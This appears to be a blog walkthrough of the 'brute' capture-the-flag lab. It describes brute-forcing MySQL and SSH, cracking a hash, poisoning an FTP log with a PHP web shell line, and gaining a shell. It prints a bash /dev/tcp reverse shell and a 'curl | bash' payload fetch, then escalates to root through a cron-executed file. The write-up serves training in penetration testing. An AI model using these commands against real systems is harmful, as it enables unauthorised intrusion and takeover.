
+++
title = "brute"
date = 2024-10-15T21:20:16
draft = false
tags = ["bruteforce", "log poisoning"]
+++


Recon : 
a quick ping to verify the target is up. ![2024-02-03_20-15.png](/images/2024-02-03_20-15.png)

the target is up, will run a quick rust scan on the target to find open ports. 

![2024-02-03_22-14.png](/images/2024-02-03_22-14.png)

4 open ports, 21,22,80,3306

will run nmap scan to identify the services and versions running on those ports. 
![2024-02-03_22-17.png](/images/2024-02-03_22-17.png)

the results shows FTP, SSH AND HTTP and MYSQL and their respective versions.

Enumeration: 

Started enumeration with the ftp server, will attempt to login with an anonymous user. 
![2024-02-03_20-27.png](/images/2024-02-03_20-27.png)

Seems like, it does not permit anonymous login, will go back to that, will continue further enumeration with the web server running on port 80. Visiting the site on the web browser shows a simple login portal with username and password field. Viewed the source code, enumerated more and did not get anything. Also attempted couple of some default credentials. Were all futile. 

Also, i could try to bruteforce different services, but there are no usernames yet. Further enumeration to my mysql server, attempt to bruteforce mysql with hydra was successful atleast for now until credentials confirmed correct.

![2024-02-03_22-21.png](/images/2024-02-03_22-21.png)

Now, will login with the credentials. 


![2024-02-03_22-24.png](/images/2024-02-03_22-24.png)

and it was successful. 

Further enumeration on the mysql server. 

![2024-02-03_22-27.png](/images/2024-02-03_22-27.png)

after enumerating the database, got a username and a password hash, 

was able to crack the hash with john the ripper. ![2024-02-03_22-37.png](/images/2024-02-03_22-37.png)

Back to the web portal, will attempt the credentials.![2024-02-03_22-57.png](/images/2024-02-03_22-57.png)

and it was successful. 

There is an option to view log file which contains logs of attempted failed login to the ftp server. 
![2024-02-03_23-04.png](/images/2024-02-03_23-04.png)

That seems like there might be log poisoining, since the site run on php.

one way to find out, try!

attempt to login to the ftp server again and use this php code that calls system function. 

```txt
<?php system($_GET['cmd']); ?>
```


and try to view it in the website again. 

![2024-02-06_19-44.png](/images/2024-02-06_19-44.png)

Now, there is response back and it seems the www-data is the current user running.  

Further enumeration to get reverse shell, after confirming there is command execution, next is to get reverse shell with whatever method you prefer but i will create a payload `/bin/bash -i >& /dev/tcp/ip/port 0>&1` and save on local machine, create a simple python webserver to host the file, do not forget the netcat listener and run the following command with curl.

`curl url | bash` e.g curl http://ip/exploit | bash 

![2024-02-06_22-08_1.png](/images/2024-02-06_22-08_1.png)

and there should be a connection back. 

![2024-02-06_22-08.png](/images/2024-02-06_22-08.png)

further enumeration to escalate privileges to the user adrian. 

Poking in user adrian home directory, there are files, but the user currently running do not have permission to view but can view .reminder which seems to be a type of rule which is best64 that can be used when generating wordlists using hashcat or johntheripper, then in the last part, it shows + exclamation which means for each generated word, there must be an exclamation mark at the end. Perhaps, can be used to bruteforce ssh or any other services. 

To generate the potential passwords, add the word ettubrute to a file then type this :

john -wordlist:adrian.txt -rules:best64 -stdout > potentials



![2024-02-06_22-37.png](/images/2024-02-06_22-37.png)

Now, adding the exclamation marks. To save myself the stress, created a script in python that would do that. 

![2024-02-06_22-47.png](/images/2024-02-06_22-47.png)

Now, attempting to bruteforce ssh with the potential passwords available.  

After brute-forcing, finally got the password, 

![2024-02-06_23-11_1.png](/images/2024-02-06_23-11_1.png)


now can proceed to login. 

![2024-02-06_23-11.png](/images/2024-02-06_23-11.png)

Successfully logged in, now the user flag can be accessed. 

![2024-02-06_23-14.png](/images/2024-02-06_23-14.png)

Now further enumeration to escalate privileges to the root user. 

In the user adrian home directory, there are 2 files punch_in and punch_in.sh 

Let's do some analysis on it. 

viewing both files, ![2024-02-06_23-28.png](/images/2024-02-06_23-28.png)

![2024-02-06_23-54.png](/images/2024-02-06_23-54.png)

punch_in.sh file runs every minute and updates the punch_in file with current time. We have write permissions on punch_in and read-only permissions on punch_in.sh file.

Under FTP directory, there are some more files too.


![2024-02-07_00-07.png](/images/2024-02-07_00-07.png)


it seems like, the script file under /FTP/files takes the last line of the punch_in file and executing it using /bin/sh  
Using the punch_in file, since the current user has write permissions to it, can modify the permissions on any files

modify the punch_in file to have a reverse shell and set up a netcat listener. After that, will play the waiting game. 


![2024-02-07_17-56.png](/images/2024-02-07_17-56.png)

and there is the reverse connection back and also the flag! 


End. 


